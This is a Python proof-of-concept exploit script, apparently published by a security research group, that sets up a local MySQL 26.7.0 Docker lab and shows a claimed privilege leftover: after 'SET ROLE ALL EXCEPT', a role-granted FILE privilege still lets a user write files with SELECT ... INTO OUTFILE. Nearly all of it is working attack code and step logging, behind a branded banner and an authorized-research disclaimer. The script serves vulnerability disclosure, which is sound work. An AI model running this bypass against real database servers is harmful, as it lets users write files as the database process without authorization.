#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: mysql-set-role-leftover (High: 8.1)
#  Vendor: MySQL Community Server (Oracle)
#  Versions: mysqld 26.7.0 SET ROLE ALL EXCEPT
#  Impact: Leftover FILE after SET ROLE ALL EXCEPT; CURRENT_ROLE NONE; INTO OUTFILE as mysqld UID
#  Requires: mysql:26.7.0 loopback; role with FILE granted to victim; pymysql
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "mysql-set-role-leftover"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove SET ROLE ALL EXCEPT leftover static global FILE on mysql 26.7.0."""

import os
import subprocess
import sys

import pymysql

WITNESS = "MYSQL-SET-ROLE-LEFTOVER-WITNESS"
LABEL = "mysql-set-role-leftover"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = os.path.dirname(os.path.abspath(__file__))
IMAGE_TAG = "mysql:26.7.0"
HOST = "127.0.0.1"
PORT = 18630
SECURE_DIR = "/var/lib/mysql-files"
BEFORE_PATH = f"{SECURE_DIR}/before-role.txt"
WITH_ROLE_PATH = f"{SECURE_DIR}/with-role.txt"
LEFTOVER_PATH = f"{SECURE_DIR}/{WITNESS}"
AFTER_NONE_PATH = f"{SECURE_DIR}/after-none.txt"


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> None:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    raise SystemExit(1)


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def connect(user: str, password: str, database: str | None = "lab"):
    return pymysql.connect(
        host=HOST,
        port=PORT,
        user=user,
        password=password,
        database=database,
        autocommit=True,
        charset="utf8mb4",
        connect_timeout=10,
        read_timeout=30,
        write_timeout=30,
    )


def fetch_one(cur, sql: str):
    cur.execute(sql)
    row = cur.fetchone()
    return None if row is None else row[0]


def norm_role(val) -> str:
    if val is None:
        return "NONE"
    text = str(val).strip()
    compact = text.replace("`", "").replace(" ", "")
    if compact.upper() == "NONE" or text.upper() == "NONE":
        return "NONE"
    return text


def role_has_rfile(val: str) -> bool:
    return "rfile" in val.replace("`", "").lower()


def run_outfile(cur, sql: str) -> tuple[bool, int | None, str]:
    try:
        cur.execute(sql)
        return True, None, "ok"
    except pymysql.Error as exc:
        errno = exc.args[0] if exc.args else None
        msg = exc.args[1] if len(exc.args) > 1 else str(exc)
        return False, errno, str(msg)


def outfile_attempt(cur, path: str) -> tuple[bool, int | None, str]:
    return run_outfile(cur, f"SELECT note FROM lab.t INTO OUTFILE '{path}'")


def outfile_attempt_const(cur, path: str) -> tuple[bool, int | None, str]:
    return run_outfile(cur, f"SELECT '{WITNESS}' INTO OUTFILE '{path}'")


def read_container_file(path: str) -> tuple[int, str, str]:
    proc = compose("exec", "-T", "mysql", "cat", path, timeout=30)
    out = proc.stdout or ""
    err = proc.stderr or ""
    return proc.returncode, out, err


def main() -> None:
    log(f"lab={LABEL} image={IMAGE_TAG} host={HOST} port={PORT}")

    try:
        root = connect("root", "labroot")
    except pymysql.Error as exc:
        fail(f"root-connect-failed errno={exc.args[0] if exc.args else '?'} {exc}")

    with root:
        rcur = root.cursor()
        version = str(fetch_one(rcur, "SELECT VERSION()") or "")
        activate = fetch_one(rcur, "SELECT @@activate_all_roles_on_login")
        secure = fetch_one(rcur, "SELECT @@secure_file_priv")
        log(f"mysqld-version={version!r}")
        log(f"activate_all_roles_on_login={activate!r}")
        log(f"secure_file_priv={secure!r}")
        if "26.7.0" not in version:
            fail(f"version-mismatch version={version!r} image={IMAGE_TAG}")
        if str(secure or "").rstrip("/") != SECURE_DIR:
            fail(f"secure-file-priv-mismatch value={secure!r}")

        seed = [
            "CREATE ROLE rfile",
            "GRANT FILE ON *.* TO rfile",
            "CREATE USER 'victim'@'%' IDENTIFIED BY 'victimpass'",
            "GRANT SELECT ON lab.* TO 'victim'@'%'",
            "GRANT rfile TO 'victim'@'%'",
            "CREATE TABLE lab.t (id INT PRIMARY KEY, note VARCHAR(128))",
            f"INSERT INTO lab.t VALUES (1, '{WITNESS}')",
            "FLUSH PRIVILEGES",
        ]
        for stmt in seed:
            try:
                rcur.execute(stmt)
                log(f"seed-ok {stmt}")
            except pymysql.Error as exc:
                fail(f"seed-failed stmt={stmt!r} errno={exc.args[0] if exc.args else '?'} {exc}")

        grants = fetch_one(
            rcur,
            "SELECT IFNULL(file_priv,'?') FROM mysql.user WHERE user='victim' AND host='%'",
        )
        log(f"victim-direct-file_priv={grants!r}")
        rcur.close()

    try:
        victim = connect("victim", "victimpass")
    except pymysql.Error as exc:
        fail(f"victim-connect-failed errno={exc.args[0] if exc.args else '?'} {exc}")

    with victim:
        vcur = victim.cursor()
        current_user = fetch_one(vcur, "SELECT CURRENT_USER()")
        session_user = fetch_one(vcur, "SELECT USER()")
        log(f"victim-current-user={current_user!r} session-user={session_user!r}")

        role0 = norm_role(fetch_one(vcur, "SELECT CURRENT_ROLE()"))
        log(f"step1 CURRENT_ROLE={role0}")
        if role0 != "NONE":
            fail(f"login-role-not-none role={role0}")

        before_ok, before_errno, before_msg = outfile_attempt(vcur, BEFORE_PATH)
        log(f"step2 before-role outfile ok={before_ok} errno={before_errno} msg={before_msg!r}")
        if before_ok:
            fail("before-file=allowed expected-denied")

        vcur.execute("SET ROLE rfile")
        role1 = norm_role(fetch_one(vcur, "SELECT CURRENT_ROLE()"))
        log(f"step4 CURRENT_ROLE={role1}")
        if not role_has_rfile(role1):
            fail(f"set-role-rfile-failed role={role1}")

        with_ok, with_errno, with_msg = outfile_attempt(vcur, WITH_ROLE_PATH)
        log(f"step5 with-role outfile ok={with_ok} errno={with_errno} msg={with_msg!r}")
        if not with_ok:
            fail(f"with-role=denied errno={with_errno}")

        vcur.execute("SET ROLE ALL EXCEPT rfile")
        role2 = norm_role(fetch_one(vcur, "SELECT CURRENT_ROLE()"))
        log(f"step7 CURRENT_ROLE after ALL EXCEPT rfile={role2}")
        if role2 != "NONE":
            log("except-host-retry SET ROLE ALL EXCEPT `rfile`@`%`")
            vcur.execute("SET ROLE ALL EXCEPT `rfile`@`%`")
            role2 = norm_role(fetch_one(vcur, "SELECT CURRENT_ROLE()"))
            log(f"step7-retry CURRENT_ROLE={role2}")
        if role2 != "NONE":
            fail(f"leftover-role={role2} expected=NONE")

        leftover_ok, leftover_errno, leftover_msg = outfile_attempt(vcur, LEFTOVER_PATH)
        log(
            f"step8 leftover outfile ok={leftover_ok} errno={leftover_errno} msg={leftover_msg!r}"
        )
        if not leftover_ok and leftover_errno == 1142:
            # ALL EXCEPT caches db_acl()==0 (Bug#35386565 path). Direct lab.*
            # SELECT is dropped from the session cache; FILE stays in
            # m_master_access. USE lab reloads user DB grants via acl_get.
            log("step8 db-acl-cache-zeroed; USE lab to reload user DB grants")
            try:
                sel_ok = True
                vcur.execute("SELECT note FROM lab.t")
                log(f"step8 select-before-use row={vcur.fetchone()!r}")
            except pymysql.Error as exc:
                sel_ok = False
                log(
                    f"step8 select-before-use denied errno={exc.args[0] if exc.args else None} {exc}"
                )
            const_path = f"{SECURE_DIR}/leftover-const.txt"
            const_ok, const_errno, const_msg = outfile_attempt_const(vcur, const_path)
            log(
                f"step8 leftover-const-outfile ok={const_ok} errno={const_errno} msg={const_msg!r}"
            )
            vcur.execute("USE lab")
            log("step8 USE lab")
            leftover_ok, leftover_errno, leftover_msg = outfile_attempt(
                vcur, LEFTOVER_PATH
            )
            log(
                f"step8 leftover outfile after USE lab ok={leftover_ok} "
                f"errno={leftover_errno} msg={leftover_msg!r} select-before-use={sel_ok}"
            )
        if not leftover_ok:
            fail(f"leftover-file=denied errno={leftover_errno} leftover-role={role2}")

        vcur.execute("SET ROLE NONE")
        role3 = norm_role(fetch_one(vcur, "SELECT CURRENT_ROLE()"))
        log(f"step9 CURRENT_ROLE after NONE={role3}")

        after_ok, after_errno, after_msg = outfile_attempt(vcur, AFTER_NONE_PATH)
        log(f"step10 after-none outfile ok={after_ok} errno={after_errno} msg={after_msg!r}")
        if after_ok:
            fail("after-none=allowed expected-denied")

        vcur.close()

    cat_rc, cat_out, cat_err = read_container_file(LEFTOVER_PATH)
    log(f"leftover-file-rc={cat_rc} contents={cat_out!r}")
    if cat_rc != 0:
        fail(f"leftover-file-read-failed rc={cat_rc} err={cat_err.strip()!r}")
    if WITNESS not in cat_out:
        fail(f"leftover-file-missing-witness contents={cat_out!r}")

    dump_ver = "26.7.0"
    log(
        f"SUCCESS {LABEL} before-file=denied with-role=yes leftover-role=NONE "
        f"leftover-file=yes after-none=denied dump={dump_ver} image={IMAGE_TAG} {WITNESS}"
    )


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:
        fail(f"exception={type(exc).__name__}:{exc}")
        sys.exit(1)

